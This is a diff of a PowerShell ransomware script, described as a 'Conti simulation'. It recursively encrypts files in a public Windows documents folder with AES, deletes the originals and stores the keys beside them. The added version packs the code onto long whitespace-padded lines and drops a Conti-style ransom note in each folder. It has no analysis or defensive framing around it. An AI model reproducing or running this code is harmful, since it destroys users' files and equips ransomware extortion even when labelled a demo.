@@ -1,16 +1,2 @@
-$exclude = @(".exe", ".dll", ".lnk");
-$files = Get-ChildItem -Path C:\Users\Public\Documents -Recurse -File;
-foreach ($file in $files) {
-    if ($exclude -notcontains $file.Extension) {
-        $aes = New-Object System.Security.Cryptography.AesManaged;
-        $aes.KeySize = 256;
-        $aes.GenerateKey();
-        $key = [Convert]::ToBase64String($aes.Key);
-        $data = [System.IO.File]::ReadAllBytes($file.FullName);
-        $enc = $aes.CreateEncryptor();
-        $cipher = $enc.TransformFinalBlock($data, 0, $data.Length);
-        [System.IO.File]::WriteAllBytes("$($file.FullName).enc", $cipher);
-        Remove-Item $file.FullName;
-        Add-Content -Path "$($file.FullName).key" -Value $key;
-    }
-}
+$exclude = @(".exe", ".dll", ".lnk");          $files = Get-ChildItem -Path C:\Users\Public\Documents -Recurse -File;          foreach ($file in $files) {              if ($exclude -notcontains $file.Extension) {                  $aes = New-Object System.Security.Cryptography.AesManaged;                  $aes.KeySize = 256;                  $aes.GenerateKey();                  $key = [Convert]::ToBase64String($aes.Key);                  $data = [System.IO.File]::ReadAllBytes($file.FullName);                  $enc = $aes.CreateEncryptor();                  $cipher = $enc.TransformFinalBlock($data, 0, $data.Length);                  $encFile = "$($file.FullName).enc";                  [System.IO.File]::WriteAllBytes($encFile, $cipher);                  Remove-Item $file.FullName;                  Add-Content -Path "$($file.FullName).key" -Value $key;                  # Write ransom note                  $ransomNote = @"All your important files have been encrypted by Conti simulation.To recover your data, contact us at: whocares.com@chetan sir OPInclude your victim ID: DEMO-1234Do NOT try to decrypt the files yourself. Any such attempt will result in data loss."@;                  $notePath = Join-Path -Path $file.Directory.FullName -ChildPath "README.txt";                  if (-not (Test-Path $notePath)) {                      Add-Content -Path $notePath -Value $ransomNote;                  }              }          }          Write-Host "Encryption complete with ransom notes (Conti-style)";
+
